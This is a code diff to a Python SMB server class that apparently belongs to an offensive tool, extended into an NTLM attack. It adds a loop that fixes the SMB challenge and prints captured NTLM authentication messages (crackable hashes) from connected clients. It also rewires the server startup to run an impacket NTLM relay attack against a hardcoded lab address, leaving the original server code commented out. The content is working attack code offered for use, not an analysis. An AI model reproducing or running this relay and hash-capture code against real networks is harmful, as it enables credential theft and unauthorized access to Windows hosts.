@@ -6,6 +6,7 @@ import logging
 import sys
 
 from scapy.utils import colgen
+from binascii import hexlify
 from .interceptlogging import InterceptHandler
 from time import sleep
 import re
@@ -26,6 +27,8 @@ class SmbServer:
         self._lhost = lhost
         self._port = port
         self._output = output
+
+        self.myserver = None
 
         self._log_stream = StringIO()  # Logging info to the stdout
         self._users_collected = []  # Users showed to the user
@@ -199,14 +202,71 @@ class SmbServer:
             self.log_stream.truncate(0)
             self.log_stream.seek(0)
 
+    def show_server_info(self) -> None:
+        while True:
+            print("Info para probar cosas")
+            sleep(2)
+            # print(self.myserver.__server.)
+            self.myserver.setSMBChallenge("12345678abcdef00")
+            print(self.myserver._SimpleSMBServer__server.getServerOS())
+            print(self.myserver._SimpleSMBServer__server.getActiveConnections())
+            connections = self.myserver._SimpleSMBServer__server.getActiveConnections()
+            for key, value in connections.items():
+                ip = value["ClientIP"]
+                print(key)
+                print(type(value))
+                print(
+                    hexlify(value["AUTHENTICATE_MESSAGE"].getData()).decode("latin-1")
+                )
+                print(hexlify(value["CHALLENGE_MESSAGE"]["challenge"]))
+            # print(
+            #    self.myserver._SimpleSMBServer__server.getActiveConnections()[key][
+            #        "AUTHENTICATE_MESSAGE"
+            #    ]["challenge"]
+            # )
+
     def start_smbserver(self) -> None:
         """[ Function to start the smb server ]"""
+        import logging
+        from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
+        from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
+        from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
+        from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
+        from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+        from impacket.examples.logger import init
+
+        init(False)
+        Ataques = {"SMB": SMBAttack}
+        Clientes = {"SMB": SMBRelayClient}
+        target = TargetsProcessor(
+            singleTarget="192.168.253.129",
+            protocolClients=Clientes,
+        )
+
+        config = NTLMRelayxConfig()
+        config.setMode("RELAY")
+        config.target = target
+        config.setAttacks(Ataques)
+        config.setProtocolClients(Clientes)
+        config.setSMB2Support(True)
+        config.interfaceIp = "192.168.253.135"
+        server = SMBRelayServer(config)
+        server.start()
+        server.join()
+        print("hola")
+
+        """
         show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
         show_ntlmv2_thread.daemon = True
         show_ntlmv2_thread.start()
 
-        server = smbserver.SimpleSMBServer(
+        more_info_thread = Thread(target=self.show_server_info)
+        more_info_thread.daemon = True
+        more_info_thread.start()
+        
+        self.myserver = smbserver.SimpleSMBServer(
             listenAddress=self.lhost, listenPort=int(self.port)
         )
-        server.setSMBChallenge("")
-        server.start()
+        self.myserver.setSMBChallenge("")
+        self.myserver.start()
+        """
